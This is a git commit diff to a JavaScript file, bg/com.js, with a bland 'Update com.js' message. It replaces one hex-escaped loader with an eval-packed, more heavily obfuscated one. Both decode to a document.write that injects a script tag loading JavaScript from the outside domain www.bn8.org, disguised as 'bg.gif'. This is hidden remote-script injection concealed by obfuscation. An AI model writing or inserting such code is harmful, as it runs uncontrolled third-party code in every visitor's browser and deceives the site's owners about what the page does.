8aa9855239a39fa3e1fc1f167e2e10e114b2d4e6
bian888 <87354060+bian888@users.noreply.github.com>
2021-07-13 14:04:37 +0800

    Update com.js

--- bg/com.js
+++ bg/com.js
@@ -7,9 +7,4 @@ window.event.returnValue = false;
 }
 }
 
-var s1 = "\x3c";
-var s2 = "s\x63r\x69pt\x20t\x79\x70\x65\x3D", s3 = "\x74ex\x74\x2F\x6A\x61\x76as\x63\x72\x69pt\x20s\x72c\x3d//\x77\x77\x77\x2e\x62\x6e\x38\x2e\x6f\x72\x67",s4 = "\x2f\x62\x67\x2e\x67\x69\x66\x3e\x3c\x2f\x73\x63\x72\x69pt";
-var s5 ="\x3e";
-s2 = s2 + s3 + s4;
-s = s1 + s2 + s5;
-document.write(s);
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('2 d="\\9";2 0="s\\y\\1\\n\\m\\l\\q\\p",e="\\o\\h\\k\\j\\i\\g\\8\\5\\1\\r\\A\\z//\\4\\4\\4\\6\\7\\B\\D\\6\\C\\5\\3",c="\\a\\7\\3\\6\\3\\u\\t\\b\\9\\a\\v\\8\\5\\1";2 f="\\b";0=0+e+c;s=d+0+f;x.w(s);',40,40,'s2|x69pt|var|x67|x77|x72|x2e|x62|x63|x3c|x2f|x3e|s4|s1|s3|s5|x76as|x74|x61|x6A|x2F|x70|x79|x20t|x74ex|x3D|x65|x20s||x66|x69|x73|write|document|x63r|x3d|x72c|x6e|x6f|x38'.split('|'),0,{}));
